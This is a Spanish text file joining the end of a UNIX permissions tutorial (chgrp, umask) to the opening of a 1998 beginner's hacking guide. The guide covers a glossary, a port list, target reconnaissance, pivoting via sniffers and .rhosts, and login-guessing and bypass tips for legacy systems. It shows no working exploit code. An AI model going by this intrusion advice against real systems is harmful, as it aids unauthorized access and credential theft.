  opciones posibles, puedes consultar la ayuda de UNIX (man chmod)

  chgrp:

        Gracias a esta orden que nos brinda el sistema UNIX, podemos cambiar
  la propiedad de grupo a un archivo en concreto, tan solo necesitaremos 2
  requisitos para llevar a cabo la labor mencionada anteriomente, ser el
  propietario del fichero, y pertenecer al grupo al que se va a cambiar el
  archivo.

        *NOTA* El usuario root no necesita cumplir los requisitos mencionados
  anteriormente.

  Podemos utilizar esta orden de la siguiente forma:

                      chgrp nuevo_grupo fichero

  Ejemplo:

  ls -l

     -rw-rw---t   1 core    users           7 Feb  5 18:00 prueba*

  chgrp users2 prueba

  ls -l

     -rw-rw---t   1 core    users2           7 Feb  5 18:20 prueba*

        En este caso el usuario core, propietario del archivo prueba, y ademas
  miembro del grupo users2, a establecido un nuevo grupo sobre su archivo,
  users2, eliminando el que habia antes definido, users.

        De igual forma que en las ordenes chmod y chown, chgrp tambien posee
  diversos parametros que se pueden aplicar cojuntamente con esta orden, a
  continuacion los describimos:

  Sintaxis general:

     chgrp [opciones] establecimiento_del_nuevo_grupo archivo_o_directorio

  Opciones                     Descripcion
  --------                     -----------
  -c         *Nos describe con detalle solo los archivos cuya propiedad
              cambian. Si volvemos a establecer la propiedad que ya tenia, el
              sistema no mostrara nada.

  -f         *Esta opcion no imprime mensaje de error alguno sobre archivos
              cuya propiedad no pueden cambiarse.
            
  -v         *Describe con detalle los cambios de propiedad. Aunque volvamos a
              establecer los mismos, el sistema nos lo indicara.

  -R         *Esta opcion cambia de forma recursiva la propiedad de los
              directorios y todo lo que haya dentro.

  --help     *Muestra como usar chgrp con sus respectivos parametros

  --version  *Imprime informacion de la version chgrp utilizado por nuestro
              S.O

        Si te interesa concretar mas a cerca de este comando con todas sus
  opciones posibles, puedes consultar la ayuda de UNIX (man chmod)

  umask:

        Para finalizar este apartado, y el final de este documento, daremos
  paso a la explicacion del comando umask o mascara.

        Gracias a este comando podemos especificar cuales seran los permisos
  predeterminados que obtendran los archivos o directorios, al crearse.

        Seguramente a lo largo de este largo documento, a medida que habeis
  ido leyendo y aprendiendo diversas cosas, os habeis parado por un momento
  a pensar sobre que permisos tendria un archivo justamente despues de haber
  sido creado. Para responder a esta pregunta nos podemos ayudar del comando
  citado anteriormente, umask. Si lo ejecutamos como hemos dicho
  anteriormente, sin ningun tipo de parametro, el sistema nos contestara con
  un numero formado por 3 digitos, el primer digito se referira al due¤o del
  archivo, el segundo al grupo que corresponde el creador del archivo, y el
  tercer digito el resto de usuarios.

        Observa el siguiente cuadro que muestra los valores mas comunes de
  umask y sus valores asociados:

  Fig 1.

         Umask               Ficheros               Directorios
    ---------------------------------------------------------------
         000                -rw-rw-rw-              drwxrwxrwx
         002                -rw-rw-r--              drwxrwxr-x
         006                -rw-rw----              drwxrwx--x
         007                -rw-rw----              drwxrwx---
         022                -rw-r--r--              drwxr-xr-x
         026                -rw-r-----              drwxr-x--x
         027                -rw-r-----              drwxr-x---
         066                -rw-------              drwx--x--x
         067                -rw-------              drwx--x---
         077                -rw-------              drwx------

    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
         0         proporciona permisos de      proporciona todos los
                   lectura y escritura          permisos

         1         proporciona permisos de      proporciona permisos de
                   lectura y escritura          lectura y escritura
        
         2         propociona permisos de       proporciona permisos de
                   lectura                      lectura y ejecucion

         4         proporciona permisos de      proporciona permisos de
                   escritura                    escritura y ejecucion

        *NOTA* Como puedes observar ,umask, al igual que chmod, te permite
  sumar los valores (1, 2 y 4) para poder atribuir mas de un permiso a un
  archivo o directorio.

  Ejemplo:

                    umask

                    022

        Despues de ejecutar el comando umask en el sistema, este nos responde
  con el numero 022, con esto nos quiere decir que todo archivo que creemos
  se inicializara con los permisos -rw-r--r-- y drwxr-xr-x para los
  directorios.

  Ejemplo2:

                    umask 077  

        Al ejecutar esta sentencia haremos entender al sistema, que a partir
  de ese momento todo archivo que creemos obtendra los permisos -rw------- y
  drwx------ para directorios. Como habreis observado los dos ultimos 7
  son sumados (4+2+1) para especificar mas de un permiso.

        *NOTA* Aunque cambiemos el valor del umask, este no sera permanente,
  ya que dicha sentencia esta definida en uno de los archivos de arranque
  de todo sistema UNIX, y al reiniciar la maquina, volveria a tener
  el valor de siempre. Si quisieramos un valor permanente distinto
  al que esta establecido por defecto, tendriamos que modificar los
  archivos de arranque del S.O

  7. Despedida
  ------------
        Espero que todo aquel que haya leido este texto, pueda ahora
  desemvolverse sin ningun tipo de problema por los sistemas UNIX en lo
  referente a permisos.
        Quiero agradecer a todo aquel que se a mostrado interesado en leer
  este documento, tanto si ya poseia estos conocimientos como si no.

        Hemos dado basicamente (sin entrar en profundidad sobre ciertos
  temas), todo lo referente a permisos de este S.O. Finalmente quiero volver
  a recalcar, que todo aquel que no haya entendido algo en concreto, crea que
  he podido cometer algun error, o simplemente piense que he podido o deberia
  haber agregado alguna cosa mas a todo lo dicho anteriormente, puede ponerse
  en contacto conmigo, y informarme sobre ello.

                                                              by  Koji
                                                         soykoji@hotmail.com

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

                      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ 
                      Û INTRODUCCION AL HACKING v2.0 Û
                      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

  POR DAEMON 25-01-1998
  Daemond@usa.net
  Dillet@usa.net


        Antes que nada, he de decir que el contenido de este texto esta
  solamente destinado a usos educacionales, de investigacion y/o de
  desarrollo. En ningun momento el creador de este texto se hace
  responsable de los da¤os causados debido a un mal uso de el mismo.

        Bien, en este texto se recopilan los aspectos basicos del hacking
  para toda la gente que esta empezando. El objetivo es una estructuracion de
  la informacion para asi no tener que leer mil textos que te repiten los
  mismos conceptos una y otra vez. Espero que este texto sea de utilidad a
  todo el que este empezando en estos temas asi como puede dar algunas ideas
  a los que tengan un nivel medio.

        Tambien es verdad que en este texto se cuentan algunos metodos de
  hacking aunque muchas veces se dejan cosas en el tintero que seran
  explicadas en otros textos.. }-)

        Tambien, aunque no se diga constantemente a lo largo del texto, la
  mayoria de las ideas aqui indicadas son para sistemas UNIX y derivados por
  lo que si os enfrentais a otras cosas como el Moco$oft NT dudo que os sirva
  alguna de las ideas aqui expuestas. Igualmente, para conseguir un acceso si
  nos encontramos ante un firewall la mayoria de las tecnicas aqui explicadas 
  tampoco funcionaran por lo que habra que exprimirse un poco mas el tarro :(

        Por cierto, no pongo acentos para evitar las tipicas putadillas :)

        Como siempre digo, sugerencias, dudas y preguntas.. e incluso
  criticas a mi mail.

				Dillet@usa.net
				Daemond@usa.net

        Me gustaria que me maileaseis ( leo todos los mails que recibo) para
  decirme si algun apartado del texto no queda lo suficientemente claro ya
  que me gustaria que este texto sirviese para todo el mundo e ir
  actualizando para posteriores revisiones. Para tecnicas de hacking mas
  avanzadas que las que aqui se exponen, ya escribire textos aparte de este,
  ya que esto es una introduccion y no cuenta tecnicas avanzadas. Tambien me
  podeis mailear para pedirme posteriores ediciones de este texto o de otros
  textos de parecidas caracteristicas :)

        Igualmente, supongo que en un texto tan grande habra fallos por lo
   que cualquier ayuda para corregirlos es bienvenida ;o)

  Asi, la ESTRUCTURA DEL TEXTO sera:

0.- Glosario
1.- Buscando maquina objetivo y algunas cosas sobre unix orientado al hacking
2.- Introduccion a distintos sistemas
3.- Como conseguir una cuenta
4.- Como obtener cuentas
4.1.- Cuentas por defecto
4.2.- Ingenieria social
4.3.- Conseguir fichero passwd con algun bug
4.4.- Conseguir directamente una cuenta con un bug
4.5.- PHF
4.6.- Xploits que te dan directamente una shell
4.7.- Otros metodos (FTP, Spoofing, etc)
5.- Salir de shell restringida
6.- Crackear password de maquinas UNIX
6.1.- Introduccion y algoritmo de cifrado.
6.2.- Conseguir el fichero de passwd estando dentro de la maquina
6.2.1.- Introduccion
6.2.2.- Password shadowing
6.2.3.- NIS
6.3.- Distintos metodos para bajaros el fichero de passwd una vez lo 
tienes bajo control
	6.4.- Como se crackean
	6.5.- Que crackeador de password usar.
7.- Obtener acceso de root
7.1.- Fuerza bruta
7.2.- Exploits
7.3.- Troyanos
8.- Hackear con condon.
9.- Borrar huellas.
10.- Preservar el acceso y poner sniffers
11.- Legalidad
12.- Despedida

  0. GLOSARIO

        En este glosario, lo primero que se ha de definir es la palabra
  HACKER ya que esto es lo que nos va a llevar todo este texto.

        Un hacker es una persona con un conocimiento importante de sistemas 
  operativos, redes, protocolos, lenguajes de programacion, etc. con lo que
  se podria resumir tener un dominio de la seguridad en redes. Asi, opino
  que un hacker no es un chaval que le pasan algunos logins y passwords y
  que se dedica a entrar a la maquina y ejecutar exploits que ni sabe ni lo
  que hacen ni le importa, sino que simplemente sabe que le dan categoria
  de rOOt. Para mi esto se puede hacer durante una temporada para aprender
  pero siempre como una etapa para llegar mas adelante a fines mas
  interesantes :)

        Resumiendo, un HACKER deberia ser una persona con amplios
  conocimientos y que sabe en todo momento perfectamente lo que hace y que
  entra en sistemas por diversion y no para destrozar sistemas o cosas
  parecidas. Aunque para otros como el famoso Marcus J. Ranum compara los
  hackers con "vandals", pero en fin, hay opiniones para todos los gustos
  :o(

        En fin despues de este rollo filosofico que opino que es necesario en
  un texto de introduccion a estos temas, paso a comentaros un breve glosario
  para introducirse en la jerga de este mundillo.

  Este glosario esta por orden alfabetico:

        ADMINISTRADOR, sysop, root :Esla persona que se encarga del sistema.
  Se suele denominar rOOt y es la persona que tiene el poder absoluto sobre
  la maquina. Tiene un UID=0.

        AGUJERO, bug, hole : Es und efecto en el software o hardware que como
  su nombre indica deja agujeros para los hackers y que gracias a dios
  existen muchos ya que si no esto seria de locos jeje

        AIX: Sistema operativo de IBM

        BUGS y EXPLOITS: Los bugs son fallos en el software o en el hardware y
  que usan los hackers para entrar en sistemas y un exploit es un programa que 
  aprovecha el agujero dejado por el bug. Ver AGUJERO.

        BOMBA LOGICA: Codigo que ejecuta una particular manera de ataque
  cuando una determinada condicion se produce. Por ejemplo una bomba logica
  puede formatear el disco duro un dia determinado, pero a diferencia de un
  virus.. la bomba logica no se replica.

        BACKDOOR :Puerta trasera. Mecanismo que tiene o que se debe crear en
  un software para acceder de manera indebida (jeje)

        BBS (Bulletin Board System): Es una maquina a la que se accede a
  traves de la linea telefonica y donde se dejan mensajes y software. La
  putada es que si la bbs no esta en tu ciudad.. timofonica se hace
  millonaria a tu costa. :o(

        BOXING: Uso de aparatos electronicos o electricos (Boxes) para hacer 
  phreaking. Esto no es hacking sino phreaking... hay blue box, red box, etc.

        BOUNCER: Tecnica que consiste en usar una maquina de puente y que 
  consigue que telneteando al puerto xxxx de la maquina "bouncerada" te 
  redireccione la salida a un puerto determinado de otra maquina. Esta tecnica
  es muy usada en el irc redireccionando a los puertos destinados a los
  servidores de irc por anonimicidad y otros temas que no vienen al caso.

        CABALLOS DE TROYA :Programa que se queda residente en un sistema y 
  que ha sido desarrollado para obtener algun tipo de informacion. Por
  ejemplo seria un caballo de troya un programa que al ejecutarlo envie el
  fichero de /etc/passwd a una determinada IP (Casualmente la nuestra ;o)

        CORTAFUEGOS: Ver firewall

        COPS: Programa de seguridad.

        CERT (Computer Emergency Response Team): Bien, como su nombre indica 
  es una gente que se dedica de trabajar en seguridad pero que en su esfuerzo 
  por informar de bugs nuevos, casi nos ayudan mas a nosotros que a ellos :o>

        CLOACKER: Programa que borra los logs (huellas) en un sistema.
  Tambien llamados zappers.

        CRACKER : Esta palabra tiene dos acepciones, por un lado se denomina 
  CRACKER a un HACKER que entra a un sistema con fines malvados aunque 
  normalmente la palabra CRACKER se usa para denominara a la gente que 
  desprotege programas, los modifica para obtener determinados privilegios,
  etc.

        CRACKEADOR DE PASSWORDS:Programa utilizado para sacar los password 
  encriptados de los archivos de passwords. Esto se desarrollara mas adelante 
  en este texto

        DAEMON: Proceso en background en los sistemas Unix, es decir un
  proceso que esta ejecutandose en segundo plano.

        EXPLOIT Metodo concreto de usar un bug para entrar en un sistema. 

        FIREWALL, cortafuego: Sistema avanzado de seguridad que impide a 
  personas no acreditadas el acceso al sistema mediante el filtrado de los 
  paquetes dependiendo de la IP de origen, en otras palabras, una putada :o(.
  En la actualidad esta considerado como uno de los medios de seguridad mas 
  fiables y hay poca documentacion al respecto de como hackearlos.

        FUERZA BRUTA (hackear por...) Es el procedimiento que usan tanto los 
  crackeadores de password de UNIX como los de NT (o por lo menos los que yo 
  conozco) que se basan en aprovechar diccionarios para comparar con los 
  passwords del sistema para obtenerlos. Esto se desarrolla mas adelante en 
  este texto.

        FAKE MAIL: Enviar correo falseando el remitente. Es muy util en
  ingenieria social.

        GRAN HERMANO: Cuando la gente se refiere al Gran Hermano, se refiere a 
  todo organismo legal de lucha contra el mundo underground.

        GUSANO: Termino famoso a partir de Robert Morris, Jr.Gusanos son 
  programas que se reproducen ellos mismos copiandose una y otra vez de 
  sistema a sistema y que usa recursos de los sistemas atacados.

        HACKING :Amplia definicion al principio del glosario.

        HACKER :Amplia definicion al principio del glosario.

        HOLE: Ver bug.

        HP/UX: Sistema operativo de HP.

        INGENIERIA SOCIAL :Obtencion de informacion por medios ajenos a la 
  informatica. Sobre esto nos extenderemos mas adelante en este texto.

        IRIX: Sistema operativo.

        ISP (Internet Services Provider): Proveedor de servicios internet.

        KEY: Llave. Se puede traducir por clave de acceso a un software o
  sistema.

        KERBEROS: Sistema de seguridad en el que los login y los passwords van 
  encriptados.

        KEVIN MITNICK: Es el hacker por excelencia!!!. Sus haza¤as se pueden 
  encontrar en mil sitios en la red.

        LAMER: Un lamer es una persona que no tiene ninguna inquietud por
  todos estos temas de la seguridad sino que lo unico que quiere es tener un
  login y un pass para entrar a un sistema y formatear el disco duro, o para
  decirle a un amigo que es un superhacker.. o el tipico que te llega en el
  IRC y te dice.. he suspendido un examen y quiero entrar al ordenador de mi
  escuela para cambiar las notas. Esto os prometo que me ha pasado mas de una
  vez :o(
  Importante es distinguir lamer de newbie o novato. Un novato o newbie es una 
  persona que SI que tiene interes en estos temas pero que logicamente
  necesita un tiempo de aprendizaje ya que nadie ha nacido aprendico.

        LINUX: Sistema operativo de la familia UNIX y que es muy adecuado
  para tenerlo en la maquina de casa ya que no requiere demasiados recursos.
  Este sistema operativo lo debes tener en tu casa si quieres hacer algo en
  el mundo del hacking aunque ya se comentara mas adelante.

        LOGIN : Para entrar en un sistema por telnet se necesita siempre un
  login (nombre) y un password (clave).

        MAQUINA: En este texto, habitualmente se utilizara el termino maquina
  para referirse al ordenador. Mejor no entrar en filosofias :->

        MAIL BOMBER: Es una tecnica de puteo que consiste en el envio masivo
  de mails a una direccion (para lo que hay programas destinados al efecto)
  con la consiguiente problematica asociada para la victima. Solo aconsejo su
  uso en situaciones criticas.

        NUKEAR: Consiste en joder a gente debido a bugs del sistema operativo
  o de los protocolos. Esto se da habitualmente en el IRC y considero que es
  una perdida de tiempo... pero hay mucha gente que su cabecita no da para
  mas y se entretiene con estas pijadas. ¨Sera porque no son capaces de
  enfrentarse a cosas mas serias??  :->

        PASSWORD :Contrase¤a asociada a un login. Tambien se llama asi al
  famoso fichero de UNIX /etc/passwd que contiene los passwords del sistema
  que se comentaran mas adelante en este texto.

        PHREAKING: Consiste en evitar total o parcialmente el pago a las
  grandes multinacionales. Este concepto se usa basicamente para referirse
  al pago del telefono ya que tal y como esta Timofonica apetece. En general,
  es complicado conseguirlo en Espa¤a, pero hay que intentarlo. :->>

        PIRATA:Persona dedicada a la copia y distribucion de software ilegal,
  tando software comercial crackeado, como shareware registrado, etc...No
  hay que confundir en absoluto este termino con el de hacker ya que tal como
  se ve en las definiciones no tiene nada que ver.

        PPP: Point-to-point protocol... RFC 1661.

        PASSWORD CRACKER: Ver CRACKEADOR DE PASSWORD.

        PGP: Pretty Good Privacy. Necesario cuando os paseis mails
        "calentitos". Es un programa de encriptacion de llave publica.

        PHRACK: zine sobre hack muy famosa.

        PUERTO-PORT: Se define mas adelante en este texto.

        PORT SCANNER: Programa que te indica que puertos de una maquina estan 
  abiertos. Mas adelante en este texto se explican estos conceptos mas 
  detenidamente.

        ROOT,administrador, sysop: Persona que tiene control total sobre el
        sistema y cuyo UID es 0.

        ROUTER: Maquina de la red que se encarga de encauzar el flujo de
  paquetes.

        SNIFFER: Es un programa que monitoriza los paquetes de datos que
  circulan por una red. Mas claramente, todo lo que circula por la red va en
  'paquetes de datos' que el sniffer chequea en busca de informacion
  referente unas cadenas prefijadas por el que ha instalado el programa.

        SHELL: Este concepto puede dar lugar a confusion ya que una shell
  en un sistema unix es un programa que interactua entre el kernel y el
  usuario mientras que en nuestros ambientes significa el conjunto de login
  y password.... es decir que si alguien dice que cambia shells ya sabeis a lo
  que se refiere no? :)

        SUNOS: Sistema operativo de Sun.

        SOLARIS: Sistema operativo de Sun.

        SYSOP: Ver rOOt.

        TCP/IP: Arquitectura de red con un conjunto de protocolos. Es la que
  se suele usar en Internet.. para mas info sobre el tema cualquier libro de
  TCP/IP es valido..

        TONELOC: Posiblemente el mejor war dealer (como la cerveza) jeje

        TRACEAR :Seguir la pista a traves de la red a una informacion o de una 
  persona. 

        UDP: Protocolo de comunicacion que a diferencia del TCP no es
  orientado a conexion.

        UNIX: Familia de sistemas operativos que engloba a SunOS, Solaris,
  irix, etc..

        VMS: Sistema operativo.

        VIRUS: Es un programa que se reproduce a si mismo y que muy
  posiblemente ataca a otros programas. Crea copias de si mismo y suele da¤ar
  o joder datos, cambiarlos o disminuir la capacidad de tu sistema
  disminuyendo la memoria util o el espacio libre.

        WAR DIALER: Estos son programas (tambien se podria hacer a mano, pero
  es muy pesado) que realizan llamadas telefonicas en busca de modems. Sirve 
  para buscar maquinas sin hacerlo a traves de internet. Estas maquinas suelen 
  ser muy interesantes ya que no reciben tantos ataques y a veces hay suerte y 
  no estan tan cerradas. ;o)

        WORM: Ver gusano.

        WINDOWS : Sistema operativo?? ;-) .. tambien llamado ventanukos.

        ZAP: Zap es un programa que se usa para borrar las huellas en un
  sistema. Debido a lo famoso que se ha hecho muchos programas que desarrollan
  estas funciones se les llama zappers aunque precisamente este no es el
  mejor ;o)

        ZINE: Revista electronica

        Nota: En este texto se va a dar unix por sabido y solo se comentaran
  los aspectos del unix relacionados con el hacking.

  1.- BUSCANDO LA MAQUINA OBJETIVO Y ALGO SOBRE UNIX ORIENTADO AL HACKING.

        Lo primero que se ha de hacer, como es logico es determinar la
  maquina objetivo. Esta decision se puede hacer en base a distintos criterios
  como pueda ser que es una maquina especialmente interesante para ti o que es
  una maquina que sabes o te han dicho que el rOOt no es un lumbreras. Bien,
  sea como fuere, suponemos que se ha determinado la maquina objetivo.

        Tras esto, se ha de recopilar la mayor informacion sobre esa maquina.
  Lo mejor es empezar haciendo un escaneo de puertos a la maquina, esto
  consiste en ir haciendo telnet's a todos los puertos de la maquina (normales
  1-6000) para ver que programas contestan en cada puerto y su version, o si
  el puerto esta cerrado. Por ejemplo: con un telnet normal (puerto 23) d
  eterminaremos el sistema operativo, con un telnet 79 (finger) para obtener
  informacion, entrar por el netstat (puerto 15 ) si lo tiene abierto (poco
  usual), mirar si tiene pagina web y que demonio de http usa (puerto 80),
  mirar la version del sendmail (puerto 25), ver si esta el systat abierto,
  ver si tiene ftp anonimo en el 21, ver si ofrece nfs o nis, etc. Para esto
  se necesita un escaneador de puertos de los que hay muchisimos en la red
  (strobe, portscan, nmap, etc.)

        Ademas, en caso de que quieras hackear victima1.microsoft.com, en caso
  de que veas que no puedes hacer nada en esta maquina victima1, te puedes 
  plantear hackear otra del dominio microsoft.com, ya que si consigues root y 
  colocas un sniffer en victima2.microsoft.com ( o quiza con un poco de suerte 
  con el hosts.equiv o el .rhosts) seguramente podras conseguir cuentas en 
  victima1.microsoft.com. Posiblemente, esto no lo entiendas ahora, pero tras 
  leer todo el texto y tener un poco mas claro lo que es un sniffer, como
  pillar root y demas, posiblemente le encontraras mas sentido a este parrafo
  :o)

  Nota para los que vayan un poco verdes en Unix:

        El fichero hosts.equiv es un fichero que hay en los sistemas unix que
  indica que maquinas pueden ejecutar comandos remotos en esta maquina sin
  pedir ni login ni password, es decir, indica las maquinas que son
  confiables.

        Igualmente, el fichero .rhosts es un fichero que hay en el HOME de
  cada usuario que indica las maquinas a las que permite ejecutar un comando
  remoto sin pedir password.

        Ademas, os recuerdo que con el comando host puedes obtener una lista
  de maquinas pertenecientes a un dominio dado y que el comando traceroute 
  muchas veces puede ayudar ( recuerdo que el traceroute muestra el recorrido 
  que hacen los paquetes hasta llegar a la maquina destino).

        Para todos aquellos que no tienen muy claro lo que son los puertos,
  TCP, UDP, IP y demas cosas similares pueden ver el TCP IP Illustrated tomo
  1 de Stevens o el famoso NETWORKING with TCPIP que ademas creo que tiene el
  primer tomo traducido al castellano.

        A continuacion se listan los mas interesantes en principio para las
  aplicaciones que nos interesan (en los puertos que no ponga nada, se
  refieren a tcp y los que se refieran a udp se indicara):


  Numero  Servicio        Lo que hace
  de Puerto
 
  9               discard Dev/null--Basura
  11              systat          Informacion sobre los usuarios
  13                              La hora y fecha de maquina remota
  15              netstat Mucha informacion sobre la red
  17/tcp          qotd            Quote of the Day
  19              chargen Generador de caracteres
  21              ftp             Transferenciadeficheros
  22/tcp          ssh             SSH Remote Login Protocol
  23              telnet          Loginypass
  25              smpt            Para crear email.
  37              time            La      hora.
  38/tcp          rap             RouteAccessProtocol
  39              rlp             Localizacion del recurso
  42/tcp          name server     HostName Server
  43              whois           Informacion sobre la red objetivo
  49/tcp          tacacs          LoginHostProtocol(TACACS)
  50/tcp          re-mail-ck      RemoteMailCheckingProtocol
  53              domain  Nombre de la maquina remota
  63/tcp          whois++ whois++
  69/tcp          tftp            TrivialFileTransfer
  70              gopher  Buscador de informacion con bugs ;o)
  79              finger          Mucha informacion sobre los usuarios
  80              http            ServidorWeb
  88/tcp          kerberos        Kerberos
  107             rtelnet         Telnet remoto
  109/tcp pop2            PostOfficeProtocol-Version2
  110             pop3            Email entrante Version3
  111/tcp sunrpc  SUN Remote Procedure Call
  113/tcp auth            Authentication Service
  115/tcp sftp            Simple File Transfer Protocol
  117/tcp uucp-path       UUCP Path Service
  119             nntp            Grupos de noticias Usenet
  133/tcp statsrv         Statistics Service
  136/tcp profile         PROFILE Naming System
  137/tcp netbios-ns      NETBIOSNameService
  137/udp netbios-ns      NETBIOSNameService
  138/tcp netbios-dgm     NETBIOSDatagramService
  138/udp netbios-dgm     NETBIOSDatagramService
  139/tcp netbios-ssn     NETBIOSSessionService
  139/udp netbios-ssn     NETBIOSSessionService
  143/tcp imap            InternetMessageAccessProtocol (xploit remoto jeje)
  144/tcp news            NewS
  161/tcp snmp            SNMP
  194/tcp irc             InternetRelayChatProtocol
  213/tcp ipx             IPX
  220/tcp imap3           InteractiveMailAccessProtocolv3
  443             shttp           Otro servidor web teoricamente seguro
  512/udp biff            ndica a los usuarios que han recibido mail
  513/tcp rlogin          remote login
  513/udp who             who remoto y da info sobre la carga de la maquina
  514/tcp shell           Shell remota
  514/udp syslog
  515/tcp printer         spooler
  520             route           Protocolo de informacion routing
  529/tcp irc-serv        IRC-SERV

        Puedes obtener muchas listas de puertos en Internet por lo que os he
  puesto una lista resumida aunque en realidad con la practica te sueles
  remitir a un numero mas reducido de puertos pero eso que lo vea cada uno
  kon la experiencia.

        Tras saber que conocimientos se deben adquirir, ahora os comento los 
  programas que se deben tener para poder hacer cositas.

        Bien, lo primero que comentaria es que es mas comodo hackear con
  unix/linux que con el ventanukos ya que aunque es mas complejo, ofrece
  muchas mas posibilidades ya que el mismo sistema operativo te ofrece
  algunas ventajas que no ofrece el windows. No voy a entrar a comentar estas
  diferencias pero si usas unix, basicamente solo has de pillarte un
  escaneador de puertos y poco mas. Se ha de recordar que lleva incorporado el
  compilador de c, perl, la mayoria de los programas de seguridad (satan,
  cops, iss...) estan disponibles para unix asi como los programas para
  hackear, y muchas mas kosas que ya iremos descubriendo como el tiempo.
  Ademas unix te permite comandos interesantes como el host, rpcinfo, los
  comandos remotos, etc.

        Ademas, tal y como se ha comentado o comentara a lo largo del texto,
  la informacion y estar actualizado en bugs y exploits es una de las cosas
  mas importantes en este mundillo por lo que un consejo es que habitualmente
  ojeeis las paginas de hack para pillar los ultimos bugs y xploits asi como
  las listas de correo habilitadas para el respecto (bugtraq, firewall ,etc).
  Tened en cuenta que la eficacia de un xploit es inversamente proporcional
  al tiempo que hace que salio asi que no espereis entrar en muchas maquinas
  con bugs de los a¤os 80, entendeis la idea no?.

  2.- INTRODUCCION A DISTINTOS SISTEMAS

        En este texto se va a hablar de hackear maquinas Unix pero hay que
  recordar que aparte del Unix tambien existen otros sistemas operativos para
  mainframes y miniordenadores como el VMS para ordenadores VAX (de la marca
  DEC, Digital Equipment Corporation), el VM/CMS, VM/ESA, etc para ordenadores 
  IBM, y otros sistemas operativos de menor profileracion.

  Dentro de los UNIX se puede hacer diferencias:


  SO              Vendedor                Procesador              Proviene del

  IRIX            Silicon Graphics        MIPS Rxx00              System V
  ULTRIX          Digital (viejo)         MIPS R2/3000            BSD
  Digital UNIX    Digital (nuevo)                                 System V (?)
  AIX             IBM                                             BSD
  HP-UX           Hewlett Packard PA-RISC                         System V
  SCO UNIX        SCO                     Intel x86
  FreeBSD         (independiente)         Intel x86               BSD
  Linux           (independiente)         Intel x86               BSD
  SunOS           Sun (viejo)             Sparc                   BSD
  Solaris         Sun (nuevo)             Sparc / x86             System V
  UNICOS          Cray
  OSF/1           DEC                     Alpha
  ConvexOS        Convex

        Para entrar en un sistema, lo primero que has de saber es como
  funciona ya que si no, no podras manejarte en el. Por esto es importante
  conocer UNIX/LINUX ya que basicamente, conociendo este sistema operativo
  podras moverte por el resto de sistemas unix aunque de vez en cuando te
  encuentras de cada cosa por ahi que da miedo. A continuacion se describen
  algunos sistemas y en algunos se indica la pinta que tienen para poder
  identificarlos al hacerles un telnet ( Nota: esta info la he pillado de la
  red y creo que es un poco vieja pero la pongo porque opino que puede servir
  de algo):

        VMS  -  La computadora VAX es creada por Digital Equipment Corporation 
  (DEC) y corre el sistema operativo VMS (virtual memory system). VMS se 
  caracteriza por su prompt 'Username:'. Este sistema no te dira si has
  entrado un login correcto o no y te desconectara despues de tres malos
  intentos. Tambien mantiene un record de todos los logins que fallaron e
  informa al due¤o de la cuenta la proxima vez que entre cuantos intentos
  fallados se hicieron. Es uno de los sistemas mas seguros desde fuera pero ya
  dentro tiene varios errores en la seguridad. Las VAX ademas tienen uno de
  los mejores archivos de ayuda de entre los demas sistemas, para accesar a
  esta ayuda solo escribe HELP en el prompt.

        VM/CMS  -  Este sistema es ejecutado en las super computadoras de IBM 
  (International Business Machines) llamadas mainframes. Una vez conectado a 
  una de estas computadoras te mostrara un mensaje asi "VM/370 ONLINE", y te 
  dara un prompt "." justo como la TOPS-10 lo hace. Para entrar debes
  ejecutar: LOGON <usuario>

        DEC-10  - Operan el sistema operativo TOPS-10. Este tipo de maquinas
  se reconocen por el prompt "." Las series DEC-10/20 son amables con los
  hackers permitiendo varios intentos en el login prompt sin guardar un log
  de los intentos fallados. Las cuentas estan en forma [xxx,yyy]. Lo mejor de
  este sistema es la posibilidad de obtener informacion sobre las personas en
  linea antes de entrar a el usando el comando systat. Si ves una cuenta que
  lea [234,1001] BOB JONES, seria inteligente probar como password BOB, JONES,
  BOBBY, etc. Para entrar al sistema se usa el comando:

  login xxx,yyy [enter]
  password:
 
        Este sistema como antes lo habia dicho, permite intentos sin limite y
  ademas te avisa si el login que estas usando existe.

        PRIME  -  Esta computadora opera con el sistema operativo Primos. Son 
  faciles de detectar ya que lo reciben a uno con el mensaje
  "Primecon xx.xx.xx" o algo parecido dependiendo de la version que te
  encuentres. Usualmente no ofrecen ningun prompt asi que debes escribir
  "login <usuario>". Si la version es anterior a la 18.00.00 puedes presionar
  un monton de caracteres de escape o CTRL-C y entraras. Este sistema ofrece
  la capacidad de conectarte a los NUAS de todo el mundo con el comando
  NETLINK...sintax: nc <nua> Al hacer un telnet muestra un aspecto del tipo:
 
  PRIMENET 19.2.7F PPOA1

  <any text>

  ER!

  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

  CONNECT
  Primenet V 2.3  (system)
  LOGIN           (you)
  User id?        (system)
  SAPB5           (you)
  Password?       (system)
  DROWSAP         (you)
  OK,             (system)

        DECSERVER  -  Las DECs son una serie de computadoras conectadas entre
  si para formar una sola unidad de procesamiento, la funcionalidad de estos 
  sistemas es altamente utilizado por los hackers para quebrar passwords de 
  cuentas unix por la rapidez del sistema. El prompt usualmente sera: "Enter 
  Username>" aunque yo he visto otros prompts en estos sistemas.

        El nombre de usuario puede ser cualquier cosa, lo mejor sera presionar
  algo nada sospechoso como `c' o algun numero. De ahi te presentara con el
  prompt `local>'. De ahi debes ejecutar `c <sistema>' para conectarte. Para
